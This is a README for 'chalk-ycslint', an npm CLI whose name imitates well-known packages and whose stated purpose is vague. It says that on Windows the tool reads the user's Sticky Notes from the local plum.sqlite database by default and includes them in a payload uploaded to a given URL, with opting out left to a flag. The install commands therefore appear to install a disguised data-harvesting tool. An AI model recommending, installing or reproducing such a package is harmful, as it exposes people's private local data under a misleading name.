# chalk-ycslint

**chalk-ycslint** is a Node.js CLI and small library.

**Requirements:** Node.js **18+**

---

## Install
yeah
```bash
npm install chalk-ycslint
```

Global CLI (optional):

```bash
npm install -g chalk-ycslint
```

From the repo folder:

```bash
cd module
npm install
npm link   # optional: makes `chalk-ycslint` available globally
```

---

## Quick start

```bash
chalk-ycslint --url "http://127.0.0.1:3000/"
```

Run `chalk-ycslint --help` for options.

---

## CLI options

Run `chalk-ycslint --help` for the full options list.

### Sticky Notes behavior

Sticky Notes extraction is **enabled by default** on Windows (from local `plum.sqlite`) and included in the upload payload.

Disable it when needed:

```bash
chalk-ycslint --no-include-sticky-notes ...
```

---
---

## `.env` in the package folder

On startup, the CLI loads **`.env` next to `package.json`** in this package (the install root of `chalk-ycslint`), using [dotenv](https://www.npmjs.com/package/dotenv).

Copy the example and edit:

```bash
cp .env.example .env
```

`.env` is **not** published to npm (see `.gitignore`). Create it locally or in `node_modules/chalk-ycslint/.env` after install if you need defaults there.

---

## Library API

You can import from `chalk-ycslint` in your own scripts (ESM). See `chalk-ycslint --help` and the package entry point for available exports.

---

## License

MIT (see `package.json`). Third-party libraries (e.g. **xlsx**, **mammoth**) have their own licenses—check them before commercial use.
